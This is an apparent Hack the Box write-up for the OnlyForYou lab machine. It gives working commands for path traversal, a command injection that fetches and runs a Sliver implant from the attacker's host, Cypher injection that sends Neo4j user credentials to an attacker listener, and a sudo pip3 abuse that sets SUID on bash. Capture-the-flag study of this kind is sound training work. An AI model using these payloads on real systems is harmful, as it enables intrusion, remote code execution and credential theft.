---
title: "HTB • OnlyForYou"
tags:
  - "Intermediate"
  - "Linux"
  - "Medium Difficulty"
  - "Web"
  - "Neo4j"
  - "Pivoting"
  - "Cypher Injection"
  - "Python"
  - "Sudo"
  - "Path Traversal"
excerpt: "OnlyForYou is a medium Linux machine on Hack the Box that involves web exploitation, directory traversal, Neo4j Cypher injection, and sudo privilege exploitation"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-onlyforyou/"
---

OnlyForYou is a medium, Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/OnlyForYou) machine created by [**0xM4hm0ud**](https://app.hackthebox.com/users/480031), offering a journey into web exploitation and Linux privilege escalation. It starts with finding open ports, revealing SSH and HTTP. Then, we explores a web vulnerability, specifically an absolute directory traversal issue on a specific VHost. This weakness is exploited to view the source code of the main site, which is vulnerable to command injection. We exploit this vulnerability run a Sliver implant for initial access. The focus shifts to escalating privileges, discovering local listening ports, and identifying services. On port 8001, a Neo4j Cypher injection vulnerability is exploited to reveal the password for a user "john". We login via SSH and leverage John's special sudo rights to execute a Python script within a malicious archive hosted on the local Gogs service, eventually gaining root access.

## Initial Recon

For the initial reconnaissance phase, we began by setting up our environment and conducting a TCP port scan using a custom nmap wrapper script called [ctfscan](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh). This script aids in quickly and reliably scanning for open ports on the target machine.

```zsh
# Set up environment variables and run a port scan
echo rhost="10.10.11.210" >> .env
echo lhost="10.10.14.2" >> .env # Our HTB VPN client IP address
. ./.env && ctfscan $rhost
```
{:file="bryan@red_team" .nolineno}

The scan revealed two open ports:

| Transport | Port | Service | Product  | Version                 |
|:----------|:-----|:--------|:---------|:------------------------|
| TCP       | 22   | SSH     | OpenSSH  | 8.2p1 Ubuntu 4ubuntu0.5 |
| TCP       | 80   | HTTP    | nginx    | 1.18.0                  |

## Web

When making a simple HTTP GET request to the target on port 80, we were redirected to [only4you.htb](http://only4you.htb). To simplify requests, we added it to our `/etc/hosts`{:.filepath} file.

```zsh
# Add hostname to /etc/hosts
echo "$rhost\tonly4you.htb" | sudo tee -a /etc/hosts
```
{:file="bryan@red_team" .nolineno}

This allowed us to access the intended site at [http://only4you.htb](http://only4you.htb).

![Web index](web-index.png)

On the site, we found information about four employees and spotted a link to [beta.only4you.htb](http://beta.only4you.htb) in the FAQ section.

![FAQ Beta Link](web-faq-link.png)

To access this beta site easily, we added the virtual hostname to our `/etc/hosts`{:.filepath} file.

```zsh
# Add beta site to /etc/hosts
[ -z "$rhost" ] || sudo sed -Ei "s/($rhost\\s+.*)/\\1 beta.only4you.htb/" /etc/hosts
```
{:file="bryan@red_team" .nolineno}

### Beta Site

We proceeded to explore the [http://beta.only4you.htb](http://beta.only4you.htb) site. It advertised the site source code which we downloaded for further review.

![Beta site index](web-beta-index.png)

#### Arbitrary File Disclosure

After extracting the source code from the downloaded archive, we focused on the `app.py`{:.filepath} file. This file contained endpoints for a Flask application, including **/resize**, **/convert**, and **/download**. While these endpoints had some filesystem access protection, the **/download** endpoint seemed to allow reading from absolute paths.

```python
@app.route('/download', methods=['POST'])
def download():
  image = request.form['image']
  filename = posixpath.normpath(image) 
  # ...
  return send_file(filename, as_attachment=True)
```
{:file="app.py" .nolineno}

We verified this vulnerability by reading `/etc/passwd`{:.filepath}.
```zsh
# Exploit the vulnerability to read /etc/passwd
curl "http://beta.only4you.htb/download" -d "image=/etc/passwd"
```
{:file="bryan@red_team" .nolineno}

##### Exploitation

We leveraged this vulnerability to read the NGINX sites configuration file at `/etc/nginx/sites-enabled/default`{:.filepath} in search of additional information about the server.

```zsh
# Easily download files from the target filesystem using a helper function
download() { curl -s "http://beta.only4you.htb/download" --data-urlencode "image=$1"; }
download /etc/nginx/sites-enabled/default # Found /var/www/only4you.htb
download /var/www/beta.only4you.htb/app.py # Verify the existence of app.py (from source code)
download /var/www/only4you.htb/app.py # Check for app.py in /var/www/only4you.htb -> Exists!
```
{:file="bryan@red_team" .nolineno}

In the sites configuration, we discovered potential application directories in `/var/www`{:.filepath}, specifically `only4you.htb`{:.filepath} and `beta.only4you.htb`{:.filepath}. We confirmed that the beta Flask application resided in `/var/www/beta.only4you.htb/app.py`{:.filepath}. We also checked for the presence of a Flask application at `/var/www/only4you.htb/app.py`{:.filepath}. Further analysis of `/var/www/only4you.htb/app.py`{:.filepath} revealed that it imports another Python file, `form.py`{:.filepath}.

## Command Injection

We discovered that the `form.py`{:.filepath} file in `/var/www/only4you.htb`{:.filepath} used regular expressions to validate email addresses and executed unsafe shell commands that included the provided email address. The insecure regex allowed us to inject commands by appending them to a valid email address since it did not specify a beginning or end in the email address pattern.

```zsh
# Easily execute blind shell commands using a helper function
blind_cmd() {
  curl only4you.htb -s -o /dev/null \
    -d 'subject&message' --data-urlencode "email=x@x.local;($1)"
}

# Verify command execution
blind_cmd "id" | time cat # Immediate response
blind_cmd "id && sleep 3" | time cat # Delayed response
```
{:file="bryan@red_team" .nolineno}

We then exploited the command injection vulnerability to download and execute a [Sliver](https://github.com/BishopFox/sliver) implant on the target.

```shell
mtls -L 10.10.14.2 -l 8443
generate -e -l -G -o linux -m 10.10.14.2:8443 -s implant.elf
websites add-content -w onlyforyou -c implant.elf -p /f7ioYM
https -L 10.10.14.2 -l 443 -w onlyforyou
```
{:file="sliver-client" .nolineno}

```zsh
# Exploit command injection to download and execute Sliver implant
blind_cmd "bash -c 'curl -ko /tmp/f7ioYM https://$lhost/f7ioYM;chmod +x /tmp/f7ioYM;/tmp/f7ioYM'"
```
{:file="bryan@red_team" .nolineno}

## Privilege Escalation

During our enumeration process from the Sliver implant, we identified several locally listening ports. Among the discovered ports, we noticed 3306 and 7474, which hinted at MySQL and Neo4j services. Additionally, ports 3000 and 8001 seemed to host HTTP servers. We made sure to forward both of these ports to our loopback address using Sliver to easily access the services from our machine.

```shell
use
portfwd add -r 127.0.0.1:3000 -b 127.0.0.1:3000
portfwd add -r 127.0.0.1:8001 -b 127.0.0.1:8001
```
{:file="sliver-client" .nolineno}

To identify and fingerprint the web applications on these ports, we used [Wappalyzer](https://www.npmjs.com/package/wappalyzer/v/6.10.66).

```zsh
# Fingerprint web applications
for p in 3000 8001; do wappalyzer http://127.0.0.1:$p | tee logs/web-$p.json; done
```
{:file="bryan@red_team" .nolineno}

Port 3000 appeared to be running a self-hosted Git service called Gogs, while port 8001 hosted a Python web app.

### Port 8001

We were redirected to a page asking us to authenticate with a username and password.

![Port 8001 login page](privesc-port-8001-login.png)

After attempting various username and password combinations on the login page, we successfully logged in to the application using the credentials "admin:admin". We discovered an employee search feature which used the **/search** endpoint and seemed to be vulnerable to injection using a single quote character.

![Port 8001 search feature](privesc-port-8001-search.png)

We infered that this might be related to Neo4j Cypher queries due to the presence of the Neo4j service on port 7474.

[More reading on Neo4j Cypher injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)

We crafted a Cypher injection payload and confirmed that it successfully executed by receiving a HTTP 200 response.

```zsh
# Verify cypher injection vector
payload="lvHbNo' RETURN 0 AS _0//"
session="616254c6-ddff-4632-a53e-d0f0de121aec" # Admin session cookie here
curl http://localhost:8001/search -b "session=$session" -d "search=$payload" \
  -s -o /dev/null -w '%{http_code}\n'
```
{:file="bryan@red_team" .nolineno}

To simplify exploitation, we created a bash helper function to send Neo4j Cypher injection payloads. We used this injection point to extract label names out-of-band from the Neo4j database using `LOAD CSV`.

```zsh
# Start HTTP listener
python3 -m http.server -b $lhost 8080

# Create helper function to simplify exploitation
inject() {
  curl http://localhost:8001/search -s \
    -b "session=$1" --data-urlencode "search=$2" \
    -o /dev/null -w '%{http_code}\n';
}

# Use Cypher injection to send the database labels to our listener
inject $session "' RETURN 0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://$lhost:8080/?label='+label AS l RETURN 0//"
# Send keys from "user" label to our listener
for i in {0..5}; do inject $session "' RETURN 0 UNION MATCH (u:user) LOAD CSV FROM 'http://$lhost:8080/?key='+keys(u)[$i] as l RETURN 0//"; done
# send values for the "username" and "password" keys to our listener
inject $session "' RETURN 0 UNION MATCH (u:user) LOAD CSV FROM 'http://$lhost:8080/?username='+u.username+'&password='+u.password as l RETURN 0//"
```
{:file="bryan@red_team" .nolineno}

We identified two labels: "user" and "employee". Further extraction revealed keys for the "user" label, which included "username" and "password". With these keys, we extracted the hashed credentials and managed to recover the password for user "john" on [hashes.com](https://hashes.com/en/decrypt/hash). With these credentials, we gained SSH access to the system as user "john".

### Sudo Privileges

While logged in as "john", we used `sudo -l` and discovered some special sudo rights that allowed this user to run a specific command as root.

```text
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```
{:file="STDOUT" .nolineno}

The output showed that John could run `/usr/bin/pip3 download` with specific arguments. A bit of research into this command revealed that it extracts contents from compressed tar archives and runs `*/setup.py`{:.filepath}. This insight led us to host a malicious archive on the Gogs service. By creating an archive with a `setup.py`{:.filepath} containing a command execution payload, we could use John's sudo exception to execute arbitrary commands as root.

#### Gogs

After logging in to Gogs with John's credentials, we discovered a private repository named "Test". We made this repository public to allow the `pip3` command to access it.

![Make repository public](privesc-gogs-public.png)

We then created a malicious archive, `exploit.tar.gz`{:.filepath}, containing a setup script with a payload to achieve privilege escalation using a SUID shell.

```bash
# Create malicious archive
mkdir exploit
echo "__import__('os').chmod('/bin/bash',0o4755);" > exploit/setup.py
tar -czf exploit.tar.gz exploit
```
{:file="bryan@red_team" .nolineno}

We uploaded the malicious archive to Gogs and committed the changes.

![Upload our malicious archive](privesc-gogs-upload.png)

Next, we triggered the privileged code execution with John's sudo rights to execute our malicious script.

```bash
# Triggering privileged code execution
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/exploit.tar.gz
bash -p # We are now root!
```
{:file="john@only4you" .nolineno}

With successful privilege escalation, we gained root access to the target machine, read the root flag at `/root/root.txt`{:.filepath} and normalized the SUID bash executable.

```bash
# Read root flag & clean up after ourselves
cat /root/root.txt
chmod -s /bin/bash
```
{:file="root@only4you" .nolineno}